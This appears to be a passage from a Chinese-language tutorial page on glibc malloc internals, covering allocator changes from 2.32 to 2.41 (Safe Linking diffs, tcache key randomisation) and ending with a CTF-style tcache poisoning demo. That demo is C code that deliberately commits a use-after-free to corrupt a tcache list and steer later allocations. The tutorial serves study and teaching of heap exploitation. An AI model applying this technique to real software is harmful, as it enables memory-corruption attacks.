\\\n-  global_max_fast = (((s) == 0)                                                      \\\n+  global_max_fast = (((size_t) (s) &lt;= MALLOC_ALIGN_MASK - SIZE_SZ)        \\\n                      ? MIN_CHUNK_SIZE / 2 : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))\n\n static inline INTERNAL_SIZE_T\n@@ -2157,12 +2169,15 @@ do_check_malloc_state (mstate av)\n\n       while (p != 0)\n         {\n+          if (__glibc_unlikely (misaligned_chunk (p)))\n+            malloc_printerr (\"do_check_malloc_state(): \"\n+                             \"unaligned fastbin chunk detected\");\n           /* each chunk claims to be inuse */\n           do_check_inuse_chunk (av, p);\n           total += chunksize (p);\n           /* chunk belongs in this bin */\n           assert (fastbin_index (chunksize (p)) == i);\n-          p = p-&gt;fd;\n+          p = REVEAL_PTR (p-&gt;fd);\n         }\n     }\n\n@@ -2923,7 +2938,7 @@ tcache_put (mchunkptr chunk, size_t tc_idx)\n      detect a double free.  */\n   e-&gt;key = tcache;\n\n-  e-&gt;next = tcache-&gt;entries[tc_idx];\n+  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);\n   tcache-&gt;entries[tc_idx] = e;\n   ++(tcache-&gt;counts[tc_idx]);\n }\n@@ -2934,7 +2949,9 @@ static __always_inline void *\n tcache_get (size_t tc_idx)\n {\n   tcache_entry *e = tcache-&gt;entries[tc_idx];\n-  tcache-&gt;entries[tc_idx] = e-&gt;next;\n+  if (__glibc_unlikely (!aligned_OK (e)))\n+    malloc_printerr (\"malloc(): unaligned tcache chunk detected\");\n+  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);\n   --(tcache-&gt;counts[tc_idx]);\n   e-&gt;key = NULL;\n   return (void *) e;\n@@ -2960,7 +2977,10 @@ tcache_thread_shutdown (void)\n       while (tcache_tmp-&gt;entries[i])\n         {\n           tcache_entry *e = tcache_tmp-&gt;entries[i];\n-          tcache_tmp-&gt;entries[i] = e-&gt;next;\n+          if (__glibc_unlikely (!aligned_OK (e)))\n+            malloc_printerr (\"tcache_thread_shutdown(): \"\n+                             \"unaligned tcache chunk detected\");\n+          tcache_tmp-&gt;entries[i] = REVEAL_PTR (e-&gt;next);\n           __libc_free (e);\n         }\n     }\n@@ -3570,8 +3590,11 @@ _int_malloc (mstate av, size_t bytes)\n       victim = pp;                                        \\\n       if (victim == NULL)                                \\\n         break;                                                \\\n+      pp = REVEAL_PTR (victim-&gt;fd);                                     \\\n+      if (__glibc_unlikely (pp != NULL &amp;&amp; misaligned_chunk (pp)))       \\\n+        malloc_printerr (\"malloc(): unaligned fastbin chunk detected\"); \\\n     }                                                        \\\n-  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \\\n+  while ((pp = catomic_compare_and_exchange_val_acq (fb, pp, victim)) \\\n          != victim);                                        \\\n\n   if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ()))\n@@ -3583,8 +3606,11 @@ _int_malloc (mstate av, size_t bytes)\n\n       if (victim != NULL)\n         {\n+          if (__glibc_unlikely (misaligned_chunk (victim)))\n+            malloc_printerr (\"malloc(): unaligned fastbin chunk detected 2\");\n+\n           if (SINGLE_THREAD_P)\n-            *fb = victim-&gt;fd;\n+            *fb = REVEAL_PTR (victim-&gt;fd);\n           else\n             REMOVE_FB (fb, pp, victim);\n           if (__glibc_likely (victim != NULL))\n@@ -3605,8 +3631,10 @@ _int_malloc (mstate av, size_t bytes)\n                   while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count\n                          &amp;&amp; (tc_victim = *fb) != NULL)\n                     {\n+                      if (__glibc_unlikely (misaligned_chunk (tc_victim)))\n+                        malloc_printerr (\"malloc(): unaligned fastbin chunk detected 3\");\n                       if (SINGLE_THREAD_P)\n-                        *fb = tc_victim-&gt;fd;\n+                        *fb = REVEAL_PTR (tc_victim-&gt;fd);\n                       else\n                         {\n                           REMOVE_FB (fb, pp, tc_victim);\n@@ -4196,11 +4224,15 @@ _int_free (mstate av, mchunkptr p, int have_lock)\n             LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);\n             for (tmp = tcache-&gt;entries[tc_idx];\n                  tmp;\n-                 tmp = tmp-&gt;next)\n-              if (tmp == e)\n-                malloc_printerr (\"free(): double free detected in tcache 2\");\n-            /* If we get here, it was a coincidence.  We've wasted a\n-               few cycles, but don't abort.  */\n+                 tmp = REVEAL_PTR (tmp-&gt;next))\n+              {\n+                if (__glibc_unlikely (!aligned_OK (tmp)))\n+                  malloc_printerr (\"free(): unaligned chunk detected in tcache 2\");\n+                if (tmp == e)\n+                  malloc_printerr (\"free(): double free detected in tcache 2\");\n+                /* If we get here, it was a coincidence.  We've wasted a\n+                   few cycles, but don't abort.  */\n+              }\n           }\n\n         if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)\n@@ -4264,7 +4296,7 @@ _int_free (mstate av, mchunkptr p, int have_lock)\n            add (i.e., double free).  */\n         if (__builtin_expect (old == p, 0))\n           malloc_printerr (\"double free or corruption (fasttop)\");\n-        p-&gt;fd = old;\n+        p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);\n         *fb = p;\n       }\n     else\n@@ -4274,7 +4306,8 @@ _int_free (mstate av, mchunkptr p, int have_lock)\n              add (i.e., double free).  */\n           if (__builtin_expect (old == p, 0))\n             malloc_printerr (\"double free or corruption (fasttop)\");\n-          p-&gt;fd = old2 = old;\n+          old2 = old;\n+          p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);\n         }\n       while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2))\n              != old2);\n@@ -4472,13 +4505,17 @@ static void malloc_consolidate(mstate av)\n     if (p != 0) {\n       do {\n         {\n+          if (__glibc_unlikely (misaligned_chunk (p)))\n+            malloc_printerr (\"malloc_consolidate(): \"\n+                             \"unaligned fastbin chunk detected\");\n+\n           unsigned int idx = fastbin_index (chunksize (p));\n           if ((&amp;fastbin (av, idx)) != fb)\n             malloc_printerr (\"malloc_consolidate(): invalid chunk size\");\n         }\n\n         check_inuse_chunk(av, p);\n-        nextp = p-&gt;fd;\n+        nextp = REVEAL_PTR (p-&gt;fd);\n\n         /* Slightly streamlined version of consolidation code in free() */\n         size = chunksize (p);\n@@ -4896,8 +4933,13 @@ int_mallinfo (mstate av, struct mallinfo *m)\n\n   for (i = 0; i &lt; NFASTBINS; ++i)\n     {\n-      for (p = fastbin (av, i); p != 0; p = p-&gt;fd)\n+      for (p = fastbin (av, i);\n+           p != 0;\n+           p = REVEAL_PTR (p-&gt;fd))\n         {\n+          if (__glibc_unlikely (misaligned_chunk (p)))\n+            malloc_printerr (\"int_mallinfo(): \"\n+                             \"unaligned fastbin chunk detected\");\n           ++nfastblocks;\n           fastavail += chunksize (p);\n         }\n@@ -5437,8 +5479,11 @@ __malloc_info (int options, FILE *fp)\n\n               while (p != NULL)\n                 {\n+                  if (__glibc_unlikely (misaligned_chunk (p)))\n+                    malloc_printerr (\"__malloc_info(): \"\n+                                     \"unaligned fastbin chunk detected\");\n                   ++nthissize;\n-                  p = p-&gt;fd;\n+                  p = REVEAL_PTR (p-&gt;fd);\n                 }\n\n               fastavail += nthissize * thissize;\n</code></pre> <p>glibc 2.32 \u200b\u7684\u200b\u4e3b\u8981\u200b\u4fee\u6539\u200b\uff1a</p> <ol> <li>\u200b\u7ed9\u200b tcache \u200b\u548c\u200b fast bin \u200b\u8fd9\u200b\u4e24\u4e2a\u200b\u57fa\u4e8e\u200b\u5355\u5411\u200b\u94fe\u8868\u200b\u7684\u200b\u7ed3\u6784\u200b\u5b9e\u73b0\u200b\u4e86\u200b Safe Linking \u200b\u673a\u5236\u200b\uff1a\u200b\u539f\u6765\u200b <code>fd</code> \u200b\u76f4\u63a5\u200b\u4fdd\u5b58\u200b\u7684\u200b\u662f\u200b\u540e\u7ee7\u200b\u7ed3\u70b9\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u73b0\u5728\u200b <code>fd</code> \u200b\u4fdd\u5b58\u200b\u7684\u200b\u662f\u200b\u540e\u7ee7\u200b\u7ed3\u70b9\u200b\u7684\u200b\u5730\u5740\u200b\u7ecf\u8fc7\u200b <code>(&amp;fd &gt;&gt; 12) ^ fd</code> \u200b\u8fd0\u7b97\u200b\u540e\u200b\u7684\u200b\u7ed3\u679c\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u628a\u200b\u5f53\u524d\u200b\u7ed3\u70b9\u200b\u7684\u200b\u5730\u5740\u200b\u53f3\u79fb\u200b 12 \u200b\u4f4d\u200b\u518d\u200b\u5f02\u6216\u200b\u5230\u200b\u540e\u7ee7\u200b\u7ed3\u70b9\u200b\u7684\u200b\u5730\u5740\u200b\uff1b\u200b\u7531\u4e8e\u200b\u904d\u5386\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u603b\u662f\u200b\u4ece\u200b\u94fe\u8868\u200b\u5934\u200b\u5f00\u59cb\u200b\u904d\u5386\u200b\uff0c\u200b\u6240\u4ee5\u200b\u603b\u662f\u200b\u53ef\u4ee5\u200b\u77e5\u9053\u200b <code>&amp;fd</code> \u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u518d\u200b\u5f02\u6216\u200b\u56de\u53bb\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u6b63\u786e\u200b\u7684\u200b\u5730\u5740\u200b</li> <li>\u200b\u7ed9\u200b tcache \u200b\u548c\u200b fast bin \u200b\u6dfb\u52a0\u200b\u4e86\u200b\u66f4\u200b\u591a\u200b\u5bf9\u9f50\u200b\u68c0\u67e5\u200b\uff0c\u200b\u4f8b\u5982\u200b\u5728\u200b 64 \u200b\u4f4d\u4e0b\u200b\uff0c\u200b\u5757\u200b\u603b\u662f\u200b\u4f1a\u200b\u5bf9\u9f50\u200b\u5230\u200b 16 \u200b\u5b57\u8282\u200b</li> </ol> <p>\u200b\u4e4b\u524d\u200b\u7f16\u5199\u200b\u7684\u200b <code>dump_tcache</code> \u200b\u9700\u8981\u200b\u6539\u5199\u200b\u6210\u200b\u5982\u4e0b\u200b\u7684\u200b\u4ee3\u7801\u200b\uff1a</p> <pre><code>void dump_tcache(tcache_perthread_struct *tcache) {\n  for (int i = 0; i &lt; TCACHE_MAX_BINS; i++) {\n    if (tcache-&gt;counts[i]) {\n      tcache_entry *p = tcache-&gt;entries[i];\n      printf(\"tcache bin #%d: %p\", i, p);\n      // handle safe linking\n      p = (tcache_entry *)(((uintptr_t)&amp;p-&gt;next &gt;&gt; 12) ^ (uintptr_t)p-&gt;next);\n      while (p) {\n        printf(\" -&gt; %p\", p);\n        p = (tcache_entry *)(((uintptr_t)&amp;p-&gt;next &gt;&gt; 12) ^ (uintptr_t)p-&gt;next);\n      }\n      printf(\"\\n\");\n    }\n  }\n}\n</code></pre>"},{"location":"software/glibc_allocator.html#glibc-233","title":"glibc 2.33","text":"<p>glibc 2.33 \u200b\u7684\u200b\u4e3b\u8981\u200b\u4fee\u6539\u200b\u662f\u200b\u6dfb\u52a0\u200b\u4e86\u200b memory tagging \u200b\u7684\u200b\u652f\u6301\u200b\uff0c\u200b\u901a\u8fc7\u200b memory tagging \u200b\u628a\u200b\u7528\u6237\u200b\u6307\u9488\u200b\u548c\u200b\u5206\u914d\u5668\u200b\u5185\u90e8\u200b\u7684\u200b\u6307\u9488\u200b\u533a\u5206\u200b\u5f00\u200b\uff0c\u200b\u4ece\u800c\u200b\u907f\u514d\u200b\u6307\u9488\u200b\u7684\u200b\u8bef\u7528\u200b\u3002\u200b\u5728\u200b\u4e0d\u200b\u652f\u6301\u200b memory tagging \u200b\u7684\u200b\u5e73\u53f0\u200b\u4e0a\u200b\uff0c\u200b\u5219\u200b\u6ca1\u6709\u200b\u53d8\u5316\u200b\u3002</p>"},{"location":"software/glibc_allocator.html#glibc-234","title":"glibc 2.34","text":"<p>glibc 2.34 \u200b\u9664\u4e86\u200b\u6539\u8fdb\u200b memory tagging \u200b\u652f\u6301\u200b\u4ee5\u5916\u200b\uff0c\u200b\u9488\u5bf9\u200b\u5206\u914d\u5668\u200b\u7684\u200b\u53d8\u5316\u200b\u4e3b\u8981\u200b\u662f\u200b tcache \u200b\u7684\u200b key \u200b\u7684\u200b\u4f7f\u7528\u200b\u3002\u200b\u5728\u200b glibc 2.31 \u200b\u7248\u672c\u200b\uff0ctcache \u200b\u7684\u200b key \u200b\u6307\u5411\u200b\u7684\u200b\u662f\u200b tcache \u200b\u672c\u8eab\u200b\uff0c\u200b\u7528\u4e8e\u200b\u68c0\u6d4b\u200b\u662f\u5426\u200b\u51fa\u73b0\u200b\u4e86\u200b double free\u3002\u200b\u4f46\u662f\u200b\u8fd9\u200b\u4e5f\u200b\u53ef\u80fd\u200b\u5bfc\u81f4\u200b tcache \u200b\u5730\u5740\u200b\u7684\u200b\u6cc4\u9732\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5728\u200b glibc 2.34 \u200b\u7248\u672c\u200b\u4e2d\u200b\uff0c\u200b\u6539\u6210\u200b\u4e86\u200b\u7528\u200b\u4e00\u4e2a\u200b\u968f\u673a\u6570\u200b\u6765\u200b\u5224\u65ad\u200b tcache entry \u200b\u662f\u5426\u200b\u5df2\u7ecf\u200b\u88ab\u200b free \u200b\u4e86\u200b\uff1a</p> <pre><code>diff --git a/malloc/malloc.c b/malloc/malloc.c\nindex 1f4bbd8edf..e065785af7 100644\n--- a/malloc/malloc.c\n+++ b/malloc/malloc.c\n@@ -252,6 +252,10 @@\n\n #include &lt;libc-internal.h&gt;\n\n+/* For tcache double-free check.  */\n+#include &lt;random-bits.h&gt;\n+#include &lt;sys/random.h&gt;\n+\n /*\n   Debugging:\n\n@@ -3060,7 +3014,7 @@ typedef struct tcache_entry\n {\n   struct tcache_entry *next;\n   /* This field exists to detect double frees.  */\n-  struct tcache_perthread_struct *key;\n+  uintptr_t key;\n } tcache_entry;\n\n /* There is one of these for each thread, which contains the\n@@ -3077,6 +3031,31 @@ typedef struct tcache_perthread_struct\n static __thread bool tcache_shutting_down = false;\n static __thread tcache_perthread_struct *tcache = NULL;\n\n+/* Process-wide key to try and catch a double-free in the same thread.  */\n+static uintptr_t tcache_key;\n+\n+/* The value of tcache_key does not really have to be a cryptographically\n+   secure random number.  It only needs to be arbitrary enough so that it does\n+   not collide with values present in applications.  If a collision does happen\n+   consistently enough, it could cause a degradation in performance since the\n+   entire list is checked to check if the block indeed has been freed the\n+   second time.  The odds of this happening are exceedingly low though, about 1\n+   in 2^wordsize.  There is probably a higher chance of the performance\n+   degradation being due to a double free where the first free happened in a\n+   different thread; that's a case this check does not cover.  */\n+static void\n+tcache_key_initialize (void)\n+{\n+  if (__getrandom (&amp;tcache_key, sizeof(tcache_key), GRND_NONBLOCK)\n+      != sizeof (tcache_key))\n+    {\n+      tcache_key = random_bits ();\n+#if __WORDSIZE == 64\n+      tcache_key = (tcache_key &lt;&lt; 32) | random_bits ();\n+#endif\n+    }\n+}\n+\n /* Caller must ensure that we know tc_idx is valid and there's room\n    for more chunks.  */\n static __always_inline void\n@@ -3086,7 +3065,7 @@ tcache_put (mchunkptr chunk, size_t tc_idx)\n\n   /* Mark this chunk as \"in the tcache\" so the test in _int_free will\n      detect a double free.  */\n-  e-&gt;key = tcache;\n+  e-&gt;key = tcache_key;\n\n   e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);\n   tcache-&gt;entries[tc_idx] = e;\n@@ -3103,7 +3082,7 @@ tcache_get (size_t tc_idx)\n     malloc_printerr (\"malloc(): unaligned tcache chunk detected\");\n   tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);\n   --(tcache-&gt;counts[tc_idx]);\n-  e-&gt;key = NULL;\n+  e-&gt;key = 0;\n   return (void *) e;\n }\n\n@@ -4413,7 +4343,7 @@ _int_free (mstate av, mchunkptr p, int have_lock)\n       trust it (it also matches random payload data at a 1 in\n       2^&lt;size_t&gt; chance), so verify it's not an unlikely\n       coincidence before aborting.  */\n-   if (__glibc_unlikely (e-&gt;key == tcache))\n+   if (__glibc_unlikely (e-&gt;key == tcache_key))\n      {\n        tcache_entry *tmp;\n        size_t cnt = 0;\n</code></pre> <p>\u200b\u6709\u200b\u4e86\u200b\u8fd9\u4e2a\u200b\u66f4\u65b0\u200b\u4ee5\u540e\u200b\uff0c\u200b\u5c31\u200b\u4e0d\u80fd\u200b\u50cf\u200b\u4e4b\u524d\u200b\u90a3\u6837\u200b\uff0c\u200b\u5148\u200b free \u200b\u4e00\u4e2a\u200b\u5757\u200b\u8fdb\u5165\u200b\u5230\u200b tcache \u200b\u4e2d\u200b\uff0c\u200b\u518d\u200b\u4ece\u200b\u5b83\u200b\u7684\u200b key \u200b\u5b57\u200b\u6bb5\u200b\u627e\u5230\u200b tcache \u200b\u7684\u200b\u5730\u5740\u200b\u4e86\u200b\u3002\u200b\u4f46\u200b\u6211\u4eec\u200b\u77e5\u9053\u200b\uff0ctcache \u200b\u4fdd\u5b58\u200b\u5728\u200b thread local storage (TLS) \u200b\u5f53\u4e2d\u200b\uff0cx86 \u200b\u7684\u200b TLS \u200b\u662f\u200b\u57fa\u4e8e\u200b fs \u200b\u6bb5\u200b\u5bc4\u5b58\u5668\u200b\u8bbf\u95ee\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u53ea\u200b\u9700\u8981\u200b\u4ece\u200b libc \u200b\u8bfb\u53d6\u200b tcache \u200b\u7684\u200b TLS offset\uff0c\u200b\u518d\u200b\u624b\u52a8\u200b\u8bfb\u53d6\u200b\u5373\u53ef\u200b\uff1a</p> <pre><code>// get tcache address from tls, offset is read from libc\nvoid *libc_base = (char *)stdout - 0x1d3760; // offset of _IO_2_1_stdout_\nuint64_t *tcache_tls_offset_ptr =\n    libc_base + 0x1d1d78; // offset of tcache tls offset, found by decompiling\n                          // __libc_malloc\nuint64_t offset = *tcache_tls_offset_ptr;\n\n// locate tcache from fs\ntcache_perthread_struct *tcache;\nasm volatile(\"movq %%fs:(%1), %0\" : \"=r\"(tcache) : \"r\"(offset));\nprintf(\"tcache is at %p\\n\", tcache);\n</code></pre> <p>\u200b\u8fd9\u4e2a\u200b\u65b9\u6cd5\u200b\u5728\u200b\u65e7\u7248\u672c\u200b\u4e2d\u200b\u4e5f\u200b\u662f\u200b\u5de5\u4f5c\u200b\u7684\u200b\uff0c\u200b\u6ce8\u610f\u200b tcache \u200b\u5728\u200b\u6ca1\u6709\u200b\u521d\u59cb\u5316\u200b\u7684\u200b\u65f6\u5019\u200b\u662f\u200b NULL\u3002</p> <p>\u200b\u5173\u4e8e\u200b TLS \u200b\u7684\u200b\u5de5\u4f5c\u200b\u539f\u7406\u200b\uff0c\u200b\u7279\u522b\u200b\u662f\u200b glibc \u200b\u6240\u200b\u4f7f\u7528\u200b\u7684\u200b initial-exec TLS model\uff0c\u200b\u8be6\u89c1\u200b ELF Handling For Thread-Local Storage\u3002</p> <p>\u200b\u6b64\u5916\u200b\uff0cglibc 2.34 \u200b\u8fd8\u200b\u628a\u200b malloc/realloc/free/memalign/after_morecore hook \u200b\u5220\u6389\u200b\u4e86\u200b\uff1a\u200b\u867d\u7136\u200b\u7b26\u53f7\u200b\u8fd8\u200b\u5728\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u8c03\u7528\u200b\u3002</p>"},{"location":"software/glibc_allocator.html#glibc-235","title":"glibc 2.35","text":"<p>glibc 2.35 \u200b\u4e3b\u8981\u200b\u662f\u200b\u6539\u8fdb\u200b\u4e86\u200b\u5206\u914d\u5668\u200b\u5bf9\u200b Transparent Huge Page \u200b\u7684\u200b\u652f\u6301\u200b\uff0c\u200b\u5176\u4f59\u200b\u6ca1\u6709\u200b\u4ec0\u4e48\u200b\u53d8\u5316\u200b\u3002</p>"},{"location":"software/glibc_allocator.html#glibc-236","title":"glibc 2.36","text":"<p>glibc 2.36 \u200b\u7684\u200b\u5206\u914d\u5668\u200b\u6709\u200b\u5c11\u91cf\u200b\u7684\u200b\u4ee3\u7801\u200b\u91cd\u6784\u200b\uff0c\u200b\u6ca1\u6709\u200b\u4ec0\u4e48\u200b\u5b9e\u8d28\u200b\u7684\u200b\u53d8\u5316\u200b\u3002</p>"},{"location":"software/glibc_allocator.html#glibc-237","title":"glibc 2.37","text":"<p>glibc 2.37 \u200b\u7684\u200b\u5206\u914d\u5668\u200b\u5bf9\u200b realloc \u200b\u7684\u200b\u5b9e\u73b0\u200b\u6709\u200b\u5c11\u91cf\u200b\u7684\u200b\u4fee\u6539\u200b\uff0c\u200b\u4f46\u200b\u76ee\u524d\u200b\u672c\u6587\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u5206\u6790\u200b realloc\uff0c\u200b\u5176\u4f59\u200b\u7684\u200b\u90e8\u5206\u200b\u6ca1\u6709\u200b\u4ec0\u4e48\u200b\u53d8\u5316\u200b\u3002</p>"},{"location":"software/glibc_allocator.html#glibc-238","title":"glibc 2.38","text":"<p>glibc 2.38 \u200b\u7684\u200b\u5206\u914d\u5668\u200b\u6dfb\u52a0\u200b\u4e86\u200b C17 aligned_alloc \u200b\u7684\u200b\u652f\u6301\u200b\uff0c\u200b\u5141\u8bb8\u200b\u5206\u914d\u200b\u7279\u5b9a\u200b\u5bf9\u9f50\u200b\u7684\u200b\u5185\u5b58\u200b\u3002\u200b\u7ed9\u200b tcache \u200b\u6dfb\u52a0\u200b\u4e86\u200b\u4ece\u200b\u4e2d\u95f4\u200b\u5220\u9664\u200b\u7ed3\u70b9\u200b\u7684\u200b\u529f\u80fd\u200b\uff0c\u200b\u4f46\u4ec5\u200b\u7528\u4e8e\u200b memalign\uff0c\u200b\u5bf9\u200b\u5df2\u6709\u200b\u7684\u200b\u5176\u4ed6\u200b\u90e8\u5206\u200b\u6ca1\u6709\u200b\u5f71\u54cd\u200b\u3002</p>"},{"location":"software/glibc_allocator.html#glibc-239","title":"glibc 2.39","text":"<p>glibc 2.39 \u200b\u7684\u200b\u5206\u914d\u5668\u200b\u9488\u5bf9\u200b free \u200b\u548c\u200b memalign \u200b\u8fdb\u884c\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u4ee3\u7801\u200b\u91cd\u6784\u200b\uff0c\u200b\u6ca1\u6709\u200b\u4ec0\u4e48\u200b\u5b9e\u8d28\u200b\u7684\u200b\u53d8\u5316\u200b\u3002</p>"},{"location":"software/glibc_allocator.html#glibc-240","title":"glibc 2.40","text":"<p>glibc 2.40 \u200b\u7684\u200b\u5206\u914d\u5668\u200b\u6ca1\u6709\u200b\u4fee\u6539\u200b\u3002</p>"},{"location":"software/glibc_allocator.html#glibc-241","title":"glibc 2.41","text":"<p>glibc 2.41 \u200b\u9488\u5bf9\u200b tcache \u200b\u8fdb\u884c\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u91cd\u6784\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6b64\u65f6\u200b calloc \u200b\u4e5f\u200b\u4f1a\u200b\u4f7f\u7528\u200b tcache \u200b\u4e86\u200b\uff0c\u200b\u4e4b\u524d\u200b\u7684\u200b\u7248\u672c\u200b\u662f\u200b\u4e0d\u4f1a\u200b\u7684\u200b\u3002\u200b\u6b64\u5916\u200b\u5bf9\u200b free \u200b\u7684\u200b\u903b\u8f91\u200b\u6709\u200b\u4e00\u5b9a\u200b\u7684\u200b\u4fee\u6539\u200b\uff1a\u200b\u4e4b\u524d\u200b\u7248\u672c\u200b chunk \u200b\u88ab\u200b free \u200b\u4ee5\u540e\u200b\u65e0\u8bba\u200b small \u200b\u8fd8\u662f\u200b large \u200b\u90fd\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u88ab\u200b\u653e\u5230\u200b unsorted bin \u200b\u91cc\u200b\uff0c\u200b\u800c\u200b glibc 2.41 \u200b\u6539\u6210\u200b\uff0c\u200b\u5982\u679c\u200b\u88ab\u200b\u91ca\u653e\u200b\u7684\u200b\u5757\u200b\u7684\u200b\u5927\u5c0f\u200b\u5bf9\u5e94\u200b small bin\uff0c\u200b\u5219\u200b\u76f4\u63a5\u200b\u653e\u5230\u200b\u5bf9\u5e94\u200b\u7684\u200b small bin \u200b\u5f53\u4e2d\u200b\uff0c\u200b\u800c\u200b\u5bf9\u5e94\u200b large bin \u200b\u7684\u200b\u5757\u200b\u624d\u200b\u653e\u5230\u200b unsorted bin \u200b\u91cc\u200b\u3002</p>"},{"location":"software/glibc_allocator.html#_9","title":"\u5c0f\u7ed3","text":"<p>\u200b\u603b\u7ed3\u200b\u4e00\u4e0b\u200b\u4ece\u200b glibc 2.31 \u200b\u4e4b\u540e\u200b\u5185\u5b58\u200b\u5206\u914d\u5668\u200b\u884c\u4e3a\u200b\u7684\u200b\u51e0\u4e2a\u200b\u5927\u200b\u7684\u200b\u53d8\u5316\u200b\uff1a</p> <ol> <li>glibc 2.32 \u200b\u5f00\u59cb\u200b\uff0ctcache \u200b\u548c\u200b fast bin \u200b\u7684\u200b\u5355\u5411\u200b\u94fe\u8868\u200b\u7684\u200b\u5730\u5740\u200b\u8fdb\u884c\u200b\u4e86\u200b\u4fdd\u62a4\u200b\uff1a<code>(&amp;fd &gt;&gt; 12) ^ fd</code></li> <li>glibc 2.34 \u200b\u5f00\u59cb\u200b\uff0ctcache \u200b\u7684\u200b key \u200b\u4e0d\u518d\u200b\u6307\u5411\u200b tcache \u200b\u81ea\u5df1\u200b\uff0c\u200b\u800c\u662f\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u4e00\u4e2a\u200b\u968f\u673a\u6570\u200b</li> <li>glibc 2.41 \u200b\u5f00\u59cb\u200b\uff0ccalloc \u200b\u4e5f\u200b\u4f1a\u200b\u4f7f\u7528\u200b tcache</li> <li>glibc 2.41 \u200b\u5f00\u59cb\u200b\uff0cfree \u200b\u9762\u5bf9\u200b\u6bd4\u8f83\u200b\u5c0f\u200b\u7684\u200b chunk\uff0c\u200b\u4f1a\u200b\u76f4\u63a5\u200b\u653e\u5230\u200b small bin \u200b\u800c\u200b\u4e0d\u662f\u200b unsorted bin</li> </ol>"},{"location":"software/glibc_allocator.html#ctf","title":"CTF","text":""},{"location":"software/glibc_allocator.html#tcache-poisoning","title":"tcache poisoning","text":"<p>\u200b\u6839\u636e\u200b\u524d\u9762\u200b\u7684\u200b\u5206\u6790\u200b\uff0ctcache \u200b\u91c7\u7528\u200b\u5355\u5411\u200b\u94fe\u8868\u200b\u7ec4\u7ec7\u200b\uff0c\u200b\u5e76\u4e14\u200b <code>next</code> \u200b\u6307\u9488\u200b\u5c31\u200b\u653e\u5728\u200b <code>payload</code> \u200b\u7684\u200b\u5f00\u5934\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5982\u679c\u200b\u6709\u200b use after free\uff0c\u200b\u5373\u200b free \u200b\u4e86\u200b\u4e00\u4e2a\u200b chunk \u200b\u4ee5\u540e\u200b\u628a\u200b payload \u200b\u5f00\u5934\u200b 8 \u200b\u4e2a\u200b\u5b57\u8282\u200b\u6539\u6389\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u7be1\u6539\u200b tcache \u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u5f71\u54cd\u200b\u540e\u7eed\u200b\u7684\u200b\u5206\u914d\u200b\uff1a</p> <pre><code>// see also:\n// https://github.com/shellphish/how2heap/blob/master/glibc_2.31/tcache_poisoning.c\n#include &lt;stdint.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n#define TCACHE_MAX_BINS 64\n\ntypedef struct tcache_entry {\n  struct tcache_entry *next;\n  struct tcache_perthread_struct *key;\n} tcache_entry;\n\ntypedef struct tcache_perthread_struct {\n  uint16_t counts[TCACHE_MAX_BINS];\n  tcache_entry *entries[TCACHE_MAX_BINS];\n} tcache_perthread_struct;\n\nvoid dump_tcache(tcache_perthread_struct *tcache) {\n  for (int i = 0; i &lt; TCACHE_MAX_BINS; i++) {\n    if (tcache-&gt;counts[i]) {\n      tcache_entry *p = tcache-&gt;entries[i];\n      printf(\"tcache bin #%d: %p\", i, p);\n      p = p-&gt;next;\n      while (p) {\n        printf(\" -&gt; %p\", p);\n        p = p-&gt;next;\n      }\n      printf(\"\\n\");\n    }\n  }\n}\n\nint main() {\n  // trigger tcache creation\n  void *p0 = malloc(32);\n  free(p0);\n  p0 = malloc(32);\n\n  // get tcache address from tls, offset is read from libc\n  void *libc_base = (char *)stdout - 0x1ed6a0; // offset of _IO_2_1_stdout_\n  uint64_t *tcache_tls_offset_ptr =\n      libc_base + 0x1ebd78; // offset of tcache tls offset, found by decompiling\n                            // __libc_malloc\n  uint64_t offset = *tcache_tls_offset_ptr;\n\n  // locate tcache from fs\n  tcache_perthread_struct *tcache;\n  asm volatile(\"movq %%fs:(%1), %0\" : \"=r\"(tcache) : \"r\"(offset));\n  printf(\"tcache is at %p\\n\", tcache);\n\n  void *p1 = malloc(32);\n  void *p2 = malloc(32);\n  free(p1);\n  printf(\"after free(p1):\\n\");\n  dump_tcache(tcache);\n  free(p2);\n  printf(\"after free(p2):\\n\");\n  dump_tcache(tcache);\n\n  // use after free\n  *(uint64_t *)p2 = (uint64_t)p0;\n  printf(\"after use after free:\\n\");\n  dump_tcache(tcache);\n\n  void *p3 = malloc(32);\n  printf(\"after malloc(p3):\\n\");\n  dump_tcache(tcache);\n  void *p4 = malloc(32);\n  printf(\"after malloc(p4):\\n\");\n  dump_tcache(tcache);\n  printf(\"p0=%p p1=%p p2=%p p3=%p p4=%p\\n\", p0, p1, p2, p3, p4);\n}\n</code></pre> 